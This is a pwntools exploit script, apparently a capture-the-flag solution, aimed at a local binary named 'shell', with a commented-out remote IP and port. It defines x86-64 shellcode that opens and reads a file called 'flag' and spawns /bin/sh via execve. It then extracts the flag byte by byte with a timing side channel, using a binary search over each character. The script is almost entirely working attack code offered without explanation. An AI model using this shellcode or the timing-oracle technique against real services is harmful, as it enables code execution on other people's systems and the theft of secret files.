from pwn import *

elf = ELF('./shell')
sh = process(elf.path)
context(arch = 'amd64', os = 'linux', log_level = 'info')
#sh = remote('121.4.15.155', 10002)
#gdb.attach(sh)

shellcode_0 = shellcraft.sh()
#print(shellcode_0)

shellcode_1 = '''
push 0x67616c66
push 0x2
pop rax
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x2c
xor rax,rax
syscall
mov rdi,1
mov rax,0x1
syscall

'''
#fd = open('flag')
#read(fd,buf,0x100)
#write(1,fd,0x100)

shellcode_2 = '''
push 0x68
mov rax,0x732f2f2f6e69622f
push rax
mov rdi,rsp
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor rsi,rsi
push rsi
push 0x8
pop rsi
add rsi,rsp
push rsi
mov rsi,rsp
xor edx,edx
push 0x3b
pop rax
syscall
'''
#execv(path = '/bin//sh', argv=['sh'], envp=0)

shellcode_3 = '''
push 0x67616c66
push 0x2
pop rax
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
push rax
pop rdi
xor rax,rax
mov rsi,rsp
push 0x40
pop rdx
syscall

'''

#payload = asm(shellcode_3)
#payload = b'a' * 0x20 + payload
#sh.sendline(payload)

#sh.interactive()

possible_char = [i for i in range(0x20, 128)]
cur_idx = 0
flag = ""
while(True):
    l = 32
    r = 128
    while(l <= r):
        if l == r:
            flag += chr(l)
            print(flag)
            break
        print(l,r)
        sh = process(elf.path)
        #sh = remote("121.4.15.155", 10002)
        mid = (l + r) // 2
        shell = asm(shellcode_3)
        shell += asm("mov bl,byte ptr[rsi + " + hex(cur_idx) + "]")
        shell += asm("cmp bl," + hex(mid))
        shell += asm("jng $-0x3")
        shell += asm("mov rax,0x7265776f6c")
        shell += asm("push rax")
        shell += asm("push 0x1")
        shell += asm("pop rax")
        shell += asm("mov rdi,1")
        shell += asm("mov rsi,rsp")
        shell += asm("mov rdx,0x10")
        shell += asm("syscall")
        shell = b'a' * 0x20 + shell
        sh.recvuntil("that?\n")
        sh.sendline(shell)
        start = time.time()
        sh.can_recv_raw(timeout = 3)
        end = time.time()
        sh.close()
        if (end - start) > 3:
            r = mid
        else:
            l = mid + 1
        sh.close()
    cur_idx += 1
    if flag[-1:] == "}":
        print(flag)
        break



    
    


